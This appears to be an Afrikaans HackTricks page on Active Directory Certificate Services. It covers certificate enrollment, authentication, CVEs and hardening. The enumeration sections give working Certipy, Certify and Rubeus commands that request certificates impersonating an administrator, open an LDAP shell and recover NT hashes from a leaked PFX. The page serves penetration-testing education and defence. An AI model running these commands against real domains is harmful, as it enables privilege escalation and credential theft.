# AD-sertifikate

{{#include ../../banners/hacktricks-training.md}}

## Inleiding

### Komponente van ’n sertifikaat

- Die **Subject** van die sertifikaat dui die eienaar daarvan aan.
- ’n **Public Key** word met ’n privaat gehoude sleutel gepaar om die sertifikaat aan die regmatige eienaar daarvan te koppel.
- Die **Validity Period**, gedefinieer deur die **NotBefore**- en **NotAfter**-datums, dui die geldigheidsduur van die sertifikaat aan.
- ’n Unieke **Serial Number**, verskaf deur die Certificate Authority (CA), identifiseer elke sertifikaat.
- Die **Issuer** verwys na die CA wat die sertifikaat uitgereik het.
- **SubjectAlternativeName** maak bykomende name vir die onderwerp moontlik en bied groter buigsaamheid vir identifikasie.
- **Basic Constraints** dui aan of die sertifikaat vir ’n CA of ’n eindentiteit is en definieer gebruiksbeperkings.
- **Extended Key Usages (EKUs)** omskryf die spesifieke doeleindes van die sertifikaat, soos kode-ondertekening of e-pos-enkripsie, deur middel van Object Identifiers (OIDs).
- Die **Signature Algorithm** spesifiseer die metode waarmee die sertifikaat onderteken word.
- Die **Signature**, wat met die uitreiker se private key geskep word, waarborg die egtheid van die sertifikaat.<sup>[[4]](#references)</sup>

### Spesiale oorwegings

- **Subject Alternative Names (SANs)** brei die toepaslikheid van ’n sertifikaat uit na verskeie identiteite, wat noodsaaklik is vir bedieners met verskeie domeine. Veilige uitreikingsprosesse is noodsaaklik om die risiko van nabootsing deur aanvallers wat die SAN-spesifikasie manipuleer, te voorkom.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) in Active Directory (AD)

AD CS erken CA-sertifikate in ’n AD-woud deur middel van aangewese houers, wat elk ’n unieke rol vervul:<sup>[[4]](#references)</sup>

- Die **Certification Authorities**-houer bevat vertroude wortel-CA-sertifikate.
- Die **Enrolment Services**-houer bevat besonderhede oor Enterprise CAs en hul sertifikaatsjablone.
- Die **NTAuthCertificates**-objek bevat CA-sertifikate wat vir AD-verifikasie gemagtig is.
- Die **AIA (Authority Information Access)**-houer vergemaklik sertifikaatkettingvalidering met intermediêre en kruis-CA-sertifikate.

### Verkryging van sertifikate: Vloeiproses vir ’n kliëntsertifikaatversoek

1. Die versoekproses begin wanneer kliënte ’n Enterprise CA vind.
2. Nadat ’n publieke-private-sleutelpaar gegenereer is, word ’n CSR geskep wat ’n publieke sleutel en ander besonderhede bevat.
3. Die CA beoordeel die CSR aan die hand van beskikbare sertifikaatsjablone en reik die sertifikaat uit volgens die sjabloon se toestemmings.
4. Na goedkeuring onderteken die CA die sertifikaat met sy private key en stuur dit aan die kliënt terug.<sup>[[4]](#references)</sup>

### Sertifikaatsjablone

Hierdie sjablone, wat binne AD gedefinieer word, beskryf die instellings en toestemmings vir die uitreiking van sertifikate. Dit sluit toegelate EKUs en registrasie- of wysigingsregte in, wat noodsaaklik is vir die bestuur van toegang tot sertifikaatdienste.<sup>[[4]](#references)</sup>

**Die sjabloonskemaweergawe is belangrik.** Ouer **v1**-sjablone (byvoorbeeld die ingeboude **WebServer**-sjabloon) het nie verskeie moderne afdwingingsinstellings nie. Die **ESC15/EKUwu**-navorsing het getoon dat ’n aanvraer op **v1-sjablone** **Application Policies/EKUs** in die CSR kan insluit wat voorkeur geniet bo die EKUs wat in die sjabloon opgestel is. Dit maak client-auth-, enrollment agent- of kode-ondertekeningsertifikate moontlik met slegs registrasieregte. Gebruik verkieslik **v2/v3-sjablone**, verwyder of vervang v1-verstekwaardes en beperk EKUs streng tot die bedoelde doel.<sup>[[1]](#references)</sup>

## Sertifikaatregistrasie

Die registrasieproses vir sertifikate word deur ’n administrateur begin, wat **’n sertifikaatsjabloon skep** wat dan deur ’n Enterprise Certificate Authority (CA) **gepubliseer** word. Dit maak die sjabloon beskikbaar vir kliëntregistrasie; dit gebeur deur die sjabloon se naam by die `certificatetemplates`-veld van ’n Active Directory-objek te voeg.<sup>[[4]](#references)</sup>

Om ’n sertifikaat aan te vra, moet ’n kliënt **registrasieregte** hê. Hierdie regte word deur sekuriteitsbeskrywers op die sertifikaatsjabloon en die Enterprise CA self gedefinieer. Toestemmings moet op albei plekke toegeken word sodat ’n versoek suksesvol kan wees.<sup>[[4]](#references)</sup>

### Registrasieregte vir sjablone

Hierdie regte word deur Access Control Entries (ACEs) gespesifiseer en beskryf toestemmings soos:<sup>[[4]](#references)</sup>

- **Certificate-Enrollment**- en **Certificate-AutoEnrollment**-regte, elk geassosieer met spesifieke GUIDs.
- **ExtendedRights**, wat alle uitgebreide toestemmings toelaat.
- **FullControl/GenericAll**, wat volle beheer oor die sjabloon verskaf.

### Registrasieregte vir Enterprise CA

Die CA se regte word in sy sekuriteitsbeskrywer uiteengesit, wat deur die Certificate Authority-bestuurskonsole toeganklik is. Sommige instellings laat selfs gebruikers met lae voorregte toe om op afstand toegang te verkry, wat ’n sekuriteitsrisiko kan inhou.<sup>[[4]](#references)</sup>

### Bykomende uitreikingskontroles

Sekere kontroles kan van toepassing wees, soos:<sup>[[4]](#references)</sup>

- **Goedkeuring deur ’n bestuurder**: Plaas versoeke in ’n hangende toestand totdat ’n sertifikaatbestuurder dit goedkeur.
- **Registrasie-agente en gemagtigde handtekeninge**: Spesifiseer die aantal vereiste handtekeninge op ’n CSR en die nodige Application Policy OIDs.

### Metodes om sertifikate aan te vra

Sertifikate kan aangevra word deur middel van:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), met DCOM-koppelvlakke.
2. **ICertPassage Remote Protocol** (MS-ICPR), deur benoemde pype of TCP/IP.
3. Die **webkoppelvlak vir sertifikaatregistrasie**, met die Certificate Authority Web Enrollment-rol geïnstalleer.
4. Die **Certificate Enrollment Service** (CES), saam met die Certificate Enrollment Policy (CEP)-diens.
5. Die **Network Device Enrollment Service** (NDES) vir netwerktoestelle, met behulp van die Simple Certificate Enrollment Protocol (SCEP).

Windows-gebruikers kan ook sertifikate deur die GUI (`certmgr.msc` of `certlm.msc`) of opdragreëlnutsgoed (`certreq.exe` of PowerShell se `Get-Certificate`-opdrag) aanvra.

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Sertifikaatverifikasie

Active Directory (AD) ondersteun sertifikaatverifikasie, hoofsaaklik deur die **Kerberos**- en **Secure Channel (Schannel)**-protokolle te gebruik.<sup>[[4]](#references)</sup>

### Kerberos-verifikasieproses

In die Kerberos-verifikasieproses word 'n gebruiker se versoek om 'n Ticket Granting Ticket (TGT) met die **private key** van die gebruiker se sertifikaat onderteken. Hierdie versoek ondergaan verskeie validerings deur die domeinbeheerder, insluitend die sertifikaat se **geldigheid**, **pad** en **herroepingstatus**. Validerings sluit ook in om te verifieer dat die sertifikaat van 'n vertroude bron afkomstig is en te bevestig dat die uitreiker in die **NTAUTH certificate store** teenwoordig is. Suksesvolle validerings lei tot die uitreiking van 'n TGT. Die **`NTAuthCertificates`**-voorwerp in AD, wat hier gevind word:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

is sentraal tot die vestiging van vertroue vir sertifikaatverifikasie.<sup>[[4]](#references)</sup>

Sedert die **KB5014754**-ontplooiing gaan moderne Kerberos-sertifikaatverifikasie meestal oor **karteringssterkte**, nie net EKU's nie.<sup>[[2]](#references)</sup> In versterkte forests:

- 'n Sertifikaat wat net 'n **UPN/DNS SAN** bevat, is dalk nie meer genoeg vir aanmelding nie.
- Die KDC verkies 'n **sterk binding**, gewoonlik die **SID-sekuriteitsuitbreiding** (`1.3.6.1.4.1.311.25.2`) of 'n sterk eksplisiete kartering in `altSecurityIdentities`.
- As die sertifikaat nie 'n sterk kartering het nie, teken DC's **Kdcsvc Event ID 39/41** in versoenbaarheidsmodus aan en weier verifikasie in afdwingingsmodus.
- In gemengde aanvalspaaie is **ESC9/ESC16** belangrik omdat hulle die SID-uitbreiding uit uitgereikte sertifikate verwyder; operateurs steun dan op eksplisiete karterings of SAN-URL-SID-formate waar die aanvalspad dit ondersteun.

### Secure Channel (Schannel)-verifikasie

Schannel fasiliteer veilige TLS/SSL-verbindings. Tydens 'n handdruk bied die kliënt 'n sertifikaat aan wat, indien dit suksesvol bekragtig word, toegang magtig.<sup>[[5]](#references)</sup> Die kartering van 'n sertifikaat na 'n AD-rekening kan onder meer Kerberos se **S4U2Self**-funksie of die sertifikaat se **Subject Alternative Name (SAN)** behels.<sup>[[4]](#references)</sup>

Schannel is ook die praktiese terugvalopsie wanneer **PKINIT** nie beskikbaar is nie. Byvoorbeeld, as 'n domeinbeheerder nie 'n geskikte **Smart Card Logon**-sertifikaat het nie, kan `certipy auth`/PKINIT-nutsgoed dalk nie 'n TGT kry nie, maar kan dieselfde sertifikaat steeds vir verifikasie en LDAP-bewerkings teen **LDAPS** of **LDAP StartTLS** gebruik word.

### AD-sertifikaatdienste-opsomming

AD se sertifikaatdienste kan met LDAP-navrae opgesom word, wat inligting oor **Enterprise Certificate Authorities (CA's)** en hul konfigurasies blootlê. Enige domeingeverifieerde gebruiker kan hierby uitkom sonder spesiale voorregte.<sup>[[4]](#references)</sup> Nutsgoed soos **[Certify](https://github.com/GhostPack/Certify)** en **[Certipy](https://github.com/ly4k/Certipy)** word gebruik vir opsomming en kwesbaarheidsassessering in AD CS-omgewings.<sup>[[6]](#references)</sup>

Opdragte om hierdie nutsgoed te gebruik, sluit in:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Certify-enumerasievlae en PKINIT met Rubeus

Die volgende Certify-opdragvariante behou hul onderskeie filters en uitvoeropsies.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus kan ook ’n wagwoordbeskermde PFX-sertifikaat vir PKINIT-verifikasie gebruik en ’n TGT aanvra. Die opsionele `/getcredentials`-switch vra ’n U2U-dienskaartjie aan en probeer om die rekening se NT-hash te herwin:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Vir ESC-spesifieke template- en CA-misbruik, sien [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Onlangse kwesbaarhede en sekuriteitsopdaterings (2022-2025)

| Jaar | ID / Naam | Impak | Belangrike gevolgtrekkings |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Privilege escalation* deur masjienrekeningsertifikate tydens PKINIT te vervals. | Die pleister is ingesluit in die sekuriteitsopdaterings van **10 Mei 2022**. Oudit- en sterk-karteringkontroles is via **KB5014754** bekendgestel; omgewings behoort nou in die *Full Enforcement*-modus te wees.  |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* in die AD CS Web Enrollment- (certsrv) en CES-rolle. | Openbare PoC's is beperk, maar die kwesbare IIS-komponente is dikwels intern blootgestel. Pas die pleister toe wat vanaf **Julie 2023** se Patch Tuesday beskikbaar is.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Op **v1-templates** kan ’n versoeker met registrasieregte **Application Policies/EKUs** in die CSR insluit wat voorkeur bo die template se EKUs geniet, en sodoende sertifikate vir kliëntstawing, enrollment agent of kodes ondertekening lewer. | Gepatch vanaf **12 November 2024**. Vervang of vervang deur nuwer v1-templates (bv. die verstek-WebServer-template), beperk EKUs volgens doel, en beperk registrasieregte. |

### Microsoft se verhardingstydlyn (KB5014754)

Microsoft het ’n uitrol in drie fases (Compatibility → Audit → Enforcement) ingestel om Kerberos-sertifikaatstawing weg te beweeg van swak implisiete karterings. Vanaf **11 Februarie 2025** skakel domeinbeheerders outomaties oor na **Full Enforcement** as die `StrongCertificateBindingEnforcement`-registerwaarde nie ingestel is nie. Microsoft het die tydlyn later bygewerk sodat terugval na die verenigbaarheidsmodus moontlik bly tot die sekuriteitsopdatering van **9 September 2025**.<sup>[[2]](#references)</sup> Administrateurs behoort:

1. Alle DC's en AD CS-bedieners op te dateer (Mei 2022 of later).
2. Gebeurtenis-ID 39/41 vir swak karterings tydens die *Audit*-fase te monitor.
3. Kliëntstawingsertifikate weer uit te reik met die nuwe **SID-uitbreiding**, of sterk handmatige karterings op te stel voordat afdwinging swak karterings blokkeer.

### Operateurnotas vir verharde woude

- **ESC1/ESC6 alleen is in 2025+ omgewings nie meer die hele storie nie.** As jy ’n sertifikaat vir ’n ander principal aanvra, benodig jy gewoonlik ook ’n sterk-karteringsartefak soos die SID-uitbreiding of ’n eksplisiete kartering.
- **ESC15 (EKUwu)** is hoofsaaklik waardevol in ongepatchte omgewings, omdat dit onskadelike **v1**-templates soos **WebServer** in sertifikate vir stawing of enrollment-agent-gebruik verander deur **Application Policies** in te voeg. Kerberos PKINIT evalueer steeds EKUs, maar **LDAP Schannel** neem ook Application Policies in ag, wat LDAP-gebaseerde misbruik relevant hou.<sup>[[1]](#references)</sup>
- **ESC16** is ’n CA-wye instelling: as die CA die SID-sekuriteituitbreiding wêreldwyd deaktiveer, val elke uitgereikte sertifikaat terug na swakker karteringsgedrag, tensy die aanvalsketting ’n SID via ’n ander ondersteunde formaat invoeg.
- **ESC7-regte is apart:** ’n CA `ManageCA`-toekenning kan veranderinge aan instellings soos `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) toelaat, terwyl `ManageCertificates` versoekgoedkeuring beheer. ’n Eksplisiete Deny op sertifikaatbestuurderregte kan daardie goedkeuringsroete blokkeer, selfs al is ’n Allow ook teenwoordig; beoordeel die effektiewe CA ACL voordat jy instellings en templates kombineer. Sien [Microsoft se CA ACL-assessering](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Verbeterings vir opsporing en verharding

* **Defender for Identity AD CS-sensor (2023-2024)** wys nou postuurbepalings vir ESC1-ESC8/ESC11 en genereer intydse waarskuwings soos *“Domain-controller certificate issuance for a non-DC”* (ESC8) en *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15). Maak seker dat sensors op alle AD CS-bedieners ontplooi is om voordeel uit hierdie opsporings te trek.<sup>[[3]](#references)</sup>
* Deaktiveer of beperk die **“Supply in the request”**-opsie streng op alle templates; verkies waardes vir SAN/EKU wat uitdruklik gedefinieer is.
* Verwyder **Any Purpose** of **No EKU** uit templates, tensy dit absoluut noodsaaklik is (hanteer ESC2-scenario's).
* Vereis **bestuurdergoedkeuring** of toegewyde Enrollment Agent-werkvloeie vir sensitiewe templates (bv. WebServer / CodeSigning).
* Beperk web enrollment (`certsrv`) en CES/NDES-eindpunte tot vertroude netwerke of plaas dit agter kliëntsertifikaatstawing.
* Dwing RPC-enrollment-enkripsie af (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) om ESC11 (RPC relay) te versag. Die vlag is **by verstek aan**, maar word dikwels vir ouer kliënte gedeaktiveer, wat die relay-risiko weer oopstel.
* Beveilig **IIS-gebaseerde enrollment-eindpunte** (CES/Certsrv): deaktiveer NTLM waar moontlik of vereis HTTPS + Extended Protection om ESC8-relays te blokkeer.

Beoordeel ESC11 op die gasheer waarop die CA loop, wat ’n domeinlidbediener eerder as ’n domeinbeheerder kan wees. Lees die aktiewe CA se `InterfaceFlags` onder `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; ’n waarde wat onleesbaar of afwesig is, lewer ’n onbekende resultaat, nie bewys dat RPC-enkripsie gedeaktiveer is nie. ’n Uitgeskakelde `IF_ENFORCEENCRYPTICERTREQUEST`-bis is ’n leidraad oor die konfigurasie wat steeds ’n bereikbare enrollment-RPC-eindpunt, afdwingbare geloofsbriewe en ’n bruikbare sertifikaattemplate vereis. Vir ESC8 is ’n HTTP NTLM-uitdaging alleen onvoldoende: bevestig dat daar ’n werkende enrollment-eindpunt is.

---

## References

- [1] [EKUwu: Nie net nog ’n AD CS ESC nie](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Veranderinge aan sertifikaatgebaseerde stawing op Windows-domeinbeheerders](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Sertifikaat-sekuriteitspostuurassesserings - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Misbruik van Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Wat is SSL/TLS-kliëntstawing en hoe werk dit?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
